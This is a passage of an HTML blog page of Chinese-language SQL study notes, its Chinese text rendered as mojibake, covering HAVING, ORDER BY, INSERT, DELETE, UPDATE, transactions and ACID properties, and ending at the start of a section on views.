class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......<br>  <span class="hljs-keyword">having</span> <span class="hljs-operator">&lt;</span>expr<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p>é¡ºåº: select -&gt; from -&gt; where -&gt; group by -&gt; having</p><p>å¦‚:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">select</span> product_type, count<span class="hljs-comment">(*)</span><br><span class="hljs-comment">  from Product</span><br><span class="hljs-comment">  group by procuct_type</span><br><span class="hljs-comment">  having count(*)</span> = <span class="hljs-number">2</span><span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><h3 id="having-å­å¥çš„æ„æˆè¦ç´ "><a href="#having-å­å¥çš„æ„æˆè¦ç´ " class="headerlink" title="having å­å¥çš„æ„æˆè¦ç´ "></a>having å­å¥çš„æ„æˆè¦ç´ </h3><p>å’ŒåŒ…å« group by å­å¥æ—¶çš„ select å­å¥ä¸€æ ·:</p><ul><li>å¸¸æ•°</li><li>èšåˆå‡½æ•°</li><li>group by å­å¥ä¸­æŒ‡å®šçš„åˆ—å</li></ul><h3 id="ç›¸å¯¹äº-having-å­å¥ï¼Œæ›´é€‚åˆå†™åœ¨-where-å­å¥ä¸­çš„æ¡ä»¶"><a href="#ç›¸å¯¹äº-having-å­å¥ï¼Œæ›´é€‚åˆå†™åœ¨-where-å­å¥ä¸­çš„æ¡ä»¶" class="headerlink" title="ç›¸å¯¹äº having å­å¥ï¼Œæ›´é€‚åˆå†™åœ¨ where å­å¥ä¸­çš„æ¡ä»¶"></a>ç›¸å¯¹äº having å­å¥ï¼Œæ›´é€‚åˆå†™åœ¨ where å­å¥ä¸­çš„æ¡ä»¶</h3><p>where å­å¥ &#x3D; æŒ‡å®šè¡Œæ‰€å¯¹åº”çš„æ¡ä»¶<br>having å­å¥ &#x3D; æŒ‡å®šç»„æ‰€å¯¹åº”çš„æ¡ä»¶</p><h3 id="where-å­å¥å’Œ-having-å­å¥çš„æ‰§è¡Œé€Ÿåº¦"><a href="#where-å­å¥å’Œ-having-å­å¥çš„æ‰§è¡Œé€Ÿåº¦" class="headerlink" title="where å­å¥å’Œ having å­å¥çš„æ‰§è¡Œé€Ÿåº¦"></a>where å­å¥å’Œ having å­å¥çš„æ‰§è¡Œé€Ÿåº¦</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå°†æ¡ä»¶å†™åœ¨ where å­å¥ä¸­è¦æ¯”å†™åœ¨ having å­å¥ä¸­çš„å¤„ç†é€Ÿåº¦å¿«ã€‚</p><p>é€šè¿‡ WHERE å­å¥æŒ‡å®šæ¡ä»¶æ—¶ï¼Œç”±äºæ’åºä¹‹å‰å°±å¯¹æ•°æ®è¿›è¡Œäº†è¿‡æ»¤ï¼Œå› æ­¤èƒ½å¤Ÿå‡å°‘æ’åºçš„æ•°æ®é‡ã€‚ä½† HAVING å­å¥æ˜¯åœ¨æ’åºä¹‹åæ‰å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„çš„.</p><h2 id="3-4-å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åº"><a href="#3-4-å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åº" class="headerlink" title="3-4 å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åº"></a>3-4 å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åº</h2><h3 id="order-by-å­å¥"><a href="#order-by-å­å¥" class="headerlink" title="order by å­å¥"></a>order by å­å¥</h3><p>é€šå¸¸ï¼Œä»è¡¨ä¸­æŠ½å–æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé¡ºåºï¼Œåˆ™ä¸ºéšæœºã€‚</p><p>åœ¨ select è¯­å¥æœ«å°¾æ·»åŠ  order by å­å¥æ¥æŒ‡å®šæ’åˆ—é¡ºåº:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> &lt;column name1&gt;, &lt;column name2&gt;, &lt;column name3&gt;, <span class="hljs-params">...</span><span class="hljs-params">...</span><br>  from &lt;table name&gt;<br>  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> &lt;æ’åºåŸºå‡†åˆ—<span class="hljs-number">1</span>&gt;, &lt;æ’åºåŸºå‡†åˆ—<span class="hljs-number">2</span>&gt;, <span class="hljs-params">...</span><span class="hljs-params">...</span>;<br></code></pre></td></tr></table></figure><p>ä¹¦å†™é¡ºåº: select -&gt; from -&gt; where -&gt; group by -&gt; having -&gt; order by</p><h3 id="æŒ‡å®šå‡åºæˆ–é™åº"><a href="#æŒ‡å®šå‡åºæˆ–é™åº" class="headerlink" title="æŒ‡å®šå‡åºæˆ–é™åº"></a>æŒ‡å®šå‡åºæˆ–é™åº</h3><p>é™åºï¼Œåœ¨åˆ—åä¹‹åä½¿ç”¨ <code>desc</code>(descendent) å…³é”®è¯:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_id, product_name, sale_price, purchase_price<br>  <span class="hljs-keyword">from</span> Product<br>  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> sale_price <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><p>å‡åºï¼Œä½¿ç”¨ <code>asc</code>(ascendent) å…³é”®è¯ã€‚</p><p>æœªæŒ‡å®šæ—¶é»˜è®¤å‡åºæ’åºã€‚</p><h3 id="æŒ‡å®šå¤šä¸ªæ’åºé”®"><a href="#æŒ‡å®šå¤šä¸ªæ’åºé”®" class="headerlink" title="æŒ‡å®šå¤šä¸ªæ’åºé”®"></a>æŒ‡å®šå¤šä¸ªæ’åºé”®</h3><p>è§„åˆ™æ˜¯ä¼˜å…ˆä½¿ç”¨å·¦ä¾§çš„é”®ï¼Œå¦‚æœè¯¥åˆ—å­˜åœ¨ç›¸åŒå€¼çš„è¯ï¼Œå†æ¥ç€å‚è€ƒå³ä¾§çš„é”®.</p><h3 id="null-çš„é¡ºåº"><a href="#null-çš„é¡ºåº" class="headerlink" title="null çš„é¡ºåº"></a>null çš„é¡ºåº</h3><p>ä½¿ç”¨å«æœ‰ null çš„åˆ—ä½œä¸ºæ’åºé”®æ—¶ï¼Œnull ä¼šåœ¨ç»“æœçš„å¼€å¤´æˆ–æœ«å°¾æ±‡æ€»æ˜¾ç¤ºã€‚</p><h3 id="åœ¨æ’åºé”®ä¸­ä½¿ç”¨æ˜¾ç¤ºç”¨çš„åˆ«å"><a href="#åœ¨æ’åºé”®ä¸­ä½¿ç”¨æ˜¾ç¤ºç”¨çš„åˆ«å" class="headerlink" title="åœ¨æ’åºé”®ä¸­ä½¿ç”¨æ˜¾ç¤ºç”¨çš„åˆ«å"></a>åœ¨æ’åºé”®ä¸­ä½¿ç”¨æ˜¾ç¤ºç”¨çš„åˆ«å</h3><p>order by å­å¥ä¸­å…è®¸ä½¿ç”¨åˆ«åã€‚</p><p>å¦‚:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select product_id <span class="hljs-keyword">as</span> <span class="hljs-built_in">id</span>, product_name, sale_price <span class="hljs-keyword">as</span> sp, purchase_price<br>  <span class="hljs-keyword">from</span> Product<br>  order <span class="hljs-keyword">by</span> sp, <span class="hljs-built_in">id</span>;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ having å­å¥æ—¶ select è¯­å¥çš„é¡ºåº:</p><p>from -&gt; where -&gt; group by -&gt; having -&gt; select -&gt; order by</p><h3 id="order-by-å­å¥ä¸­å¯ä»¥ä½¿ç”¨çš„åˆ—"><a href="#order-by-å­å¥ä¸­å¯ä»¥ä½¿ç”¨çš„åˆ—" class="headerlink" title="order by å­å¥ä¸­å¯ä»¥ä½¿ç”¨çš„åˆ—"></a>order by å­å¥ä¸­å¯ä»¥ä½¿ç”¨çš„åˆ—</h3><p>å¯ä»¥ä½¿ç”¨åœ¨ select å­å¥ä¸­æœªä½¿ç”¨çš„åˆ—å’Œèšåˆå‡½æ•°ã€‚</p><h3 id="ä¸è¦ä½¿ç”¨åˆ—ç¼–å·"><a href="#ä¸è¦ä½¿ç”¨åˆ—ç¼–å·" class="headerlink" title="ä¸è¦ä½¿ç”¨åˆ—ç¼–å·"></a>ä¸è¦ä½¿ç”¨åˆ—ç¼–å·</h3><p><mark>åˆ—ç¼–å·</mark>æ˜¯æŒ‡ select å­å¥ä¸­çš„åˆ—æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºè¿›è¡Œæ’åºæ—¶æ‰€å¯¹åº”çš„ç¼–å·(1, 2, 3,â€¦).</p><h1 id="ç¬¬4ç« -æ•°æ®æ›´æ–°"><a href="#ç¬¬4ç« -æ•°æ®æ›´æ–°" class="headerlink" title="ç¬¬4ç«  æ•°æ®æ›´æ–°"></a>ç¬¬4ç«  æ•°æ®æ›´æ–°</h1><h2 id="4-1-æ•°æ®çš„æ’å…¥-insertè¯­å¥çš„ä½¿ç”¨æ–¹æ³•"><a href="#4-1-æ•°æ®çš„æ’å…¥-insertè¯­å¥çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="4-1 æ•°æ®çš„æ’å…¥(insertè¯­å¥çš„ä½¿ç”¨æ–¹æ³•)"></a>4-1 æ•°æ®çš„æ’å…¥(insertè¯­å¥çš„ä½¿ç”¨æ–¹æ³•)</h2><h3 id="ä»€ä¹ˆæ˜¯-insert"><a href="#ä»€ä¹ˆæ˜¯-insert" class="headerlink" title="ä»€ä¹ˆæ˜¯ insert"></a>ä»€ä¹ˆæ˜¯ insert</h3><p><code>create table</code> è¯­å¥åªè´Ÿè´£åˆ›å»ºè¡¨ï¼Œä½†åˆ›å»ºå‡ºçš„è¡¨ä¸­å¹¶æ²¡æœ‰æ•°æ®ã€‚</p><h3 id="insert-è¯­å¥çš„åŸºæœ¬è¯­æ³•"><a href="#insert-è¯­å¥çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="insert è¯­å¥çš„åŸºæœ¬è¯­æ³•"></a>insert è¯­å¥çš„åŸºæœ¬è¯­æ³•</h3><p>è¯­æ³•:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span> (column1, column2, ...) <span class="hljs-keyword">values</span> (value1, value2, ...);<br></code></pre></td></tr></table></figure><p>å°†åˆ—åå’Œå€¼ç”¨é€—å·åˆ†å¼€ï¼Œåˆ†åˆ«æ‹¬åœ¨()å†…ï¼Œè¿™ç§å½¢å¼ç§°ä¸º<mark>æ¸…å•</mark>.</p><p>è¡¨ååé¢çš„åˆ—æ¸…å•å’Œ value å­å¥ä¸­çš„å€¼æ¸…å•çš„åˆ—æ•°å¿…é¡»ä¿æŒä¸€è‡´ã€‚</p><p>åŸåˆ™ä¸Šï¼Œæ‰§è¡Œä¸€æ¬¡ insert è¯­å¥ä¼šæ’å…¥ä¸€è¡Œæ•°æ®ã€‚</p><h3 id="åˆ—æ¸…å•çš„çœç•¥"><a href="#åˆ—æ¸…å•çš„çœç•¥" class="headerlink" title="åˆ—æ¸…å•çš„çœç•¥"></a>åˆ—æ¸…å•çš„çœç•¥</h3><p>å¯¹è¡¨è¿›è¡Œå…¨åˆ— insert æ—¶ï¼Œå¯ä»¥çœç•¥è¡¨ååçš„åˆ—æ¸…å•ã€‚</p><h3 id="æ’å…¥-null"><a href="#æ’å…¥-null" class="headerlink" title="æ’å…¥ null"></a>æ’å…¥ null</h3><p>ç›´æ¥åœ¨ values å­å¥çš„å€¼æ¸…å•ä¸­å†™å…¥ null.</p><p>æƒ³è¦æ’å…¥ null çš„åˆ—ä¸€å®šä¸èƒ½è®¾ç½® not null çº¦æŸ.</p><h3 id="æ’å…¥é»˜è®¤å€¼"><a href="#æ’å…¥é»˜è®¤å€¼" class="headerlink" title="æ’å…¥é»˜è®¤å€¼"></a>æ’å…¥é»˜è®¤å€¼</h3><p>åœ¨ create table è¯­å¥ä¸­è®¾ç½® <code>default</code> çº¦æŸã€‚</p><p>é»˜è®¤å€¼çš„ä½¿ç”¨æ–¹æ³•é€šå¸¸æœ‰æ˜¾å¼å’Œéšå¼ä¸¤ç§.</p><ul><li>æ˜¾å¼ï¼Œåœ¨ <code>values</code> å­å¥ä¸­æŒ‡å®š <code>default</code> å…³é”®å­—ã€‚ <code>values (&#39;0007&#39;, default, ...)</code></li><li>éšå¼ï¼Œçœç•¥è®¾å®šäº†é»˜è®¤å€¼çš„åˆ—ï¼Œåˆ—å’Œå€¼éƒ½è¦å¿½ç•¥<br>ä¸€èˆ¬ä½¿ç”¨æ˜¾å¼ã€‚</li></ul><h3 id="ä»å…¶ä»–è¡¨å¤åˆ¶æ•°æ®"><a href="#ä»å…¶ä»–è¡¨å¤åˆ¶æ•°æ®" class="headerlink" title="ä»å…¶ä»–è¡¨å¤åˆ¶æ•°æ®"></a>ä»å…¶ä»–è¡¨å¤åˆ¶æ•°æ®</h3><p>æ‰§è¡Œ <code>insert ... select</code> è¯­å¥ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function">insert <span class="hljs-keyword">into</span> <span class="hljs-title">Productcopy</span> (<span class="hljs-params">product_id, product_name, product_type, sale_price</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> product_id, product_name, product_type, sale_price</span><br><span class="hljs-function"><span class="hljs-keyword">from</span> Product</span>;<br></code></pre></td></tr></table></figure><p>insert è¯­å¥çš„ select è¯­å¥ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ where å­å¥æˆ–è€… group by å­å¥ç­‰äººå’Œè¯­æ³•(ä½¿ç”¨ order by å­å¥å¹¶ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœ).</p><h2 id="4-2-æ•°æ®çš„åˆ é™¤-deleteè¯­å¥çš„ä½¿ç”¨æ–¹æ³•"><a href="#4-2-æ•°æ®çš„åˆ é™¤-deleteè¯­å¥çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="4-2 æ•°æ®çš„åˆ é™¤(deleteè¯­å¥çš„ä½¿ç”¨æ–¹æ³•)"></a>4-2 æ•°æ®çš„åˆ é™¤(deleteè¯­å¥çš„ä½¿ç”¨æ–¹æ³•)</h2><h3 id="drop-table-è¯­å¥å’Œ-delete-è¯­å¥"><a href="#drop-table-è¯­å¥å’Œ-delete-è¯­å¥" class="headerlink" title="drop table è¯­å¥å’Œ delete è¯­å¥"></a>drop table è¯­å¥å’Œ delete è¯­å¥</h3><ul><li>drop table è¯­å¥å¯ä»¥å°†è¡¨å®Œå…¨åˆ é™¤</li><li>delete è¯­å¥ä¼šç•™ä¸‹è¡¨(å®¹å™¨), è€Œåˆ é™¤è¡¨ä¸­çš„å…¨éƒ¨æ•°æ®</li></ul><h3 id="delete-è¯­å¥çš„åŸºæœ¬è¯­æ³•"><a href="#delete-è¯­å¥çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="delete è¯­å¥çš„åŸºæœ¬è¯­æ³•"></a>delete è¯­å¥çš„åŸºæœ¬è¯­æ³•</h3><p>è¯­æ³•:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="æŒ‡å®šåˆ é™¤å¯¹è±¡çš„-delete-è¯­å¥-æœç´¢å‹delete"><a href="#æŒ‡å®šåˆ é™¤å¯¹è±¡çš„-delete-è¯­å¥-æœç´¢å‹delete" class="headerlink" title="æŒ‡å®šåˆ é™¤å¯¹è±¡çš„ delete è¯­å¥(æœç´¢å‹delete)"></a>æŒ‡å®šåˆ é™¤å¯¹è±¡çš„ delete è¯­å¥(æœç´¢å‹delete)</h3><p>è¯­æ³•:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">where</span> &lt;expr&gt;;<br></code></pre></td></tr></table></figure><p>delete è¯­å¥ä¸­ä¸èƒ½ä½¿ç”¨ <code>group by</code>ã€<code>having</code>å’Œ <code>order by</code>.</p><h2 id="4-3-æ•°æ®çš„æ›´æ–°-updateè¯­å¥çš„ä½¿ç”¨æ–¹æ³•"><a href="#4-3-æ•°æ®çš„æ›´æ–°-updateè¯­å¥çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="4-3 æ•°æ®çš„æ›´æ–°(updateè¯­å¥çš„ä½¿ç”¨æ–¹æ³•)"></a>4-3 æ•°æ®çš„æ›´æ–°(updateè¯­å¥çš„ä½¿ç”¨æ–¹æ³•)</h2><h3 id="update-è¯­å¥çš„åŸºæœ¬è¯­æ³•"><a href="#update-è¯­å¥çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="update è¯­å¥çš„åŸºæœ¬è¯­æ³•"></a>update è¯­å¥çš„åŸºæœ¬è¯­æ³•</h3><p>ç”¨äºæ›´æ”¹æ•°æ®.</p><p>è¯­æ³•:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;expr&gt;;<br></code></pre></td></tr></table></figure><p>å°†æ›´æ–°å¯¹è±¡çš„åˆ—å’Œæ›´æ–°åçš„å€¼éƒ½è®°è¿°åœ¨<code>set</code>å­å¥ä¸­ã€‚</p><p>è®¾ç½®ä¸€æ•´åˆ—.</p><h3 id="æŒ‡å®šæ¡ä»¶çš„-uupdate-è¯­å¥-æœç´¢å‹update"><a href="#æŒ‡å®šæ¡ä»¶çš„-uupdate-è¯­å¥-æœç´¢å‹update" class="headerlink" title="æŒ‡å®šæ¡ä»¶çš„ uupdate è¯­å¥(æœç´¢å‹update)"></a>æŒ‡å®šæ¡ä»¶çš„ uupdate è¯­å¥(æœç´¢å‹update)</h3><p>ä½¿ç”¨ <code>where</code> å­å¥:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;expr&gt;<br>  <span class="hljs-keyword">where</span> &lt;expr&gt;;<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-null-è¿›è¡Œæ›´æ–°"><a href="#ä½¿ç”¨-null-è¿›è¡Œæ›´æ–°" class="headerlink" title="ä½¿ç”¨ null è¿›è¡Œæ›´æ–°"></a>ä½¿ç”¨ null è¿›è¡Œæ›´æ–°</h3><p>å°†èµ‹å€¼è¡¨è¾¾å¼å³è¾¹çš„å€¼ç›´æ¥å†™ä¸º nullã€‚</p><p>ä½¿ç”¨ update è¯­å¥å¯ä»¥å°†å€¼æ¸…ç©ºä¸º null(ä½†åªé™äºæœªè®¾ç½® not null çº¦æŸçš„åˆ—).</p><h3 id="å¤šåˆ—æ›´æ–°"><a href="#å¤šåˆ—æ›´æ–°" class="headerlink" title="å¤šåˆ—æ›´æ–°"></a>å¤šåˆ—æ›´æ–°</h3><p>ä¸¤ç§å†™æ³•:</p><p>ç¬¬ä¸€ç§:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;<span class="hljs-keyword">value</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;<span class="hljs-keyword">value</span>&gt;<br>              .<br>              .<br>              .<br>  <span class="hljs-keyword">where</span> &lt;expr&gt;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">update <span class="hljs-variable">&lt;table name&gt;</span><br>  <span class="hljs-built_in">set</span> (<span class="hljs-variable">&lt;column name&gt;</span>, <span class="hljs-variable">&lt;column name&gt;</span>, ...) = (<span class="hljs-variable">&lt;value&gt;</span>, <span class="hljs-variable">&lt;value&gt;</span>, ...)<br>  where <span class="hljs-variable">&lt;expr&gt;</span><br></code></pre></td></tr></table></figure><p>é€šå¸¸ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•ã€‚</p><h2 id="4-4-äº‹åŠ¡"><a href="#4-4-äº‹åŠ¡" class="headerlink" title="4-4 äº‹åŠ¡"></a>4-4 äº‹åŠ¡</h2><h3 id="ä»€ä¹ˆæ˜¯äº‹åŠ¡-transaction"><a href="#ä»€ä¹ˆæ˜¯äº‹åŠ¡-transaction" class="headerlink" title="ä»€ä¹ˆæ˜¯äº‹åŠ¡(transaction)"></a>ä»€ä¹ˆæ˜¯äº‹åŠ¡(transaction)</h3><p>äº‹åŠ¡æ˜¯éœ€è¦åœ¨åŒä¸€ä¸ªå¤„ç†å•å…ƒä¸­æ‰§è¡Œçš„ä¸€ç³»åˆ—æ›´æ–°å¤„ç†çš„é›†åˆã€‚</p><p>ä¸€ä¸ªå¤„ç†å•å…ƒå°±æ˜¯è¡¨ä¹‹ç±»çš„ï¼Œä¸€ç³»åˆ—æ›´æ–°å¤„ç†å°±æ˜¯ä¿®æ”¹æ“ä½œã€‚</p><h3 id="åˆ›å»ºäº‹åŠ¡"><a href="#åˆ›å»ºäº‹åŠ¡" class="headerlink" title="åˆ›å»ºäº‹åŠ¡"></a>åˆ›å»ºäº‹åŠ¡</h3><p>è¯­æ³•:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">äº‹åŠ¡å¼€å§‹è¯­å¥ <span class="hljs-comment">;</span><br>  DML è¯­å¥â‘  <span class="hljs-comment">;</span><br>  DML è¯­å¥â‘¡ <span class="hljs-comment">;</span><br>  DML è¯­å¥â‘¢ <span class="hljs-comment">;</span><br>      .<br>      .<br>      .<br>äº‹åŠ¡ç»“æŸè¯­å¥ï¼ˆCOMMIT æˆ–è€… ROLLBACKï¼‰<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>å„ä¸ª DBMD éƒ½å®šä¹‰æœ‰äº‹åŠ¡çš„å¼€å§‹è¯­å¥:</p><ul><li>PostgreSQL: <code>begin transaction</code></li></ul><p>äº‹åŠ¡ç»“æŸè¯­å¥åªæœ‰ä¸¤ç§ä¸”é€šç”¨:</p><ul><li>commit</li><li>rollback<br>äº‹åŠ¡å¼€å§‹æœ‰é»˜è®¤å¼€å§‹çš„æ—¶é—´ç‚¹.</li></ul><h4 id="commit-æäº¤å¤„ç†"><a href="#commit-æäº¤å¤„ç†" class="headerlink" title="commit æäº¤å¤„ç†"></a>commit æäº¤å¤„ç†</h4><p>ç›¸å½“äºæ–‡ä»¶å¤„ç†ä¸­çš„è¦†ç›–å¤„ç†ã€‚</p><h4 id="rollback-å–æ¶ˆå¤„ç†"><a href="#rollback-å–æ¶ˆå¤„ç†" class="headerlink" title="rollback å–æ¶ˆå¤„ç†"></a>rollback å–æ¶ˆå¤„ç†</h4><p>ç›¸å½“äºæ–‡ä»¶å¤„ç†ä¸­çš„æ”¾å¼ƒä¿å­˜ã€‚</p><h4 id="äº‹åŠ¡å¤„ç†ä½•æ—¶å¼€å§‹"><a href="#äº‹åŠ¡å¤„ç†ä½•æ—¶å¼€å§‹" class="headerlink" title="äº‹åŠ¡å¤„ç†ä½•æ—¶å¼€å§‹"></a>äº‹åŠ¡å¤„ç†ä½•æ—¶å¼€å§‹</h4><p>å®é™…ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„æ•°æ®åº“äº§å“çš„äº‹åŠ¡éƒ½æ— éœ€å¼€å§‹æŒ‡ä»¤.</p><p>åŒºåˆ†äº‹åŠ¡:</p><ul><li>æ¯æ¡SQLè¯­å¥å°±æ˜¯ä¸€ä¸ªäº‹åŠ¡(è‡ªåŠ¨æäº¤æ¨¡å¼)</li><li>ç›´åˆ°ç”¨æˆ·æ‰§è¡Œcommitæˆ–è€…rollbackä¸ºæ­¢ç®—ä½œä¸€ä¸ªäº‹åŠ¡</li></ul><p>é»˜è®¤ä½¿ç”¨è‡ªåŠ¨æäº¤æ¨¡å¼çš„ DBMS æœ‰ SQL Serverã€PostgreSQLå’ŒMySQLç­‰.</p><h3 id="ACID-ç‰¹æ€§"><a href="#ACID-ç‰¹æ€§" class="headerlink" title="ACID ç‰¹æ€§"></a>ACID ç‰¹æ€§</h3><p>DBMS çš„äº‹åŠ¡éƒ½éµå¾ªå››ç§ç‰¹æ€§ï¼Œå°†è¿™å››ç§ç‰¹æ€§çš„é¦–å­—æ¯ç»“åˆèµ·æ¥ç»Ÿç§°ä¸º ACID ç‰¹æ€§ã€‚</p><h4 id="åŸå­æ€§-Atomicity"><a href="#åŸå­æ€§-Atomicity" class="headerlink" title="åŸå­æ€§ Atomicity"></a>åŸå­æ€§ Atomicity</h4><p>æŒ‡äº‹åŠ¡ç»“æŸæ—¶ï¼Œå…¶ä¸­åŒ…å«çš„æ›´æ–°è¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆå®Œå…¨ä¸æ‰§è¡Œã€‚</p><h4 id="ä¸€è‡´æ€§-Consistency"><a href="#ä¸€è‡´æ€§-Consistency" class="headerlink" title="ä¸€è‡´æ€§ Consistency"></a>ä¸€è‡´æ€§ Consistency</h4><p>æŒ‡äº‹åŠ¡ä¸­åŒ…å«çš„å¤„ç†ï¼Œè¦æ»¡è¶³æ•°æ®åº“æå‰è®¾ç½®çš„çº¦æŸ, å¦‚ä¸»é”®çº¦æŸæˆ–è€… not null çº¦æŸç­‰ã€‚</p><h4 id="éš”ç¦»æ€§-Isolation"><a href="#éš”ç¦»æ€§-Isolation" class="headerlink" title="éš”ç¦»æ€§ Isolation"></a>éš”ç¦»æ€§ Isolation</h4><p>æŒ‡çš„æ˜¯ä¿è¯ä¸åŒäº‹åŠ¡ä¹‹é—´äº’ä¸å¹²æ‰°çš„ç‰¹æ€§ã€‚</p><h4 id="æŒä¹…æ€§-Durability"><a href="#æŒä¹…æ€§-Durability" class="headerlink" title="æŒä¹…æ€§ Durability"></a>æŒä¹…æ€§ Durability</h4><p>æŒ‡åœ¨äº‹åŠ¡ç»“æŸåï¼ŒDBMS èƒ½å¤Ÿä¿è¯è¯¥æ—¶é—´ç‚¹çš„æ•°æ®çŠ¶æ€ä¼šè¢«ä¿å­˜çš„ç‰¹æ€§ã€‚</p><p>å¸¸è§ä¸ºå°†æ‰§è¡Œè®°å½•(æ—¥å¿—)ä¿å­˜åœ¨å­˜å‚¨ä»‹è´¨.</p><h1 id="ç¬¬5ç« -å¤æ‚æŸ¥è¯¢"><a href="#ç¬¬5ç« -å¤æ‚æŸ¥è¯¢" class="headerlink" title="ç¬¬5ç«  å¤æ‚æŸ¥è¯¢"></a>ç¬¬5ç«  å¤æ‚æŸ¥è¯¢</h1><h2 id="5-1-è§†å›¾"><a href="#5-1-è§†å›¾" class="headerlink" title="5-1 è§†å›¾"></a>5-1 è§†å›¾</h2><h3 id="è§†å›¾å’Œè¡¨"><a href="#è§†å›¾å’Œè¡¨" class="headerlink" title="è§†å›¾å’Œè¡¨"></a>è§†å›¾å’Œè¡¨</h3><p>è§†å›¾å’Œè¡¨çš„åŒºåˆ«: æ˜¯å¦ä¿å­˜äº†å®é™…æ•°æ®ã€‚</p><p>ä½¿ç”¨è§†å›¾æ—¶å¹¶ä¸ä¼šå°†æ•°æ®ä¿å­˜åˆ°å­˜å‚¨è®¾å¤‡ä¸­, è€Œä¸”ä¹Ÿä¸ä¼šå°†æ•°æ®ä¿å­˜åˆ°å…¶ä»–ä»»ä½•åœ°æ–¹.</p><p> 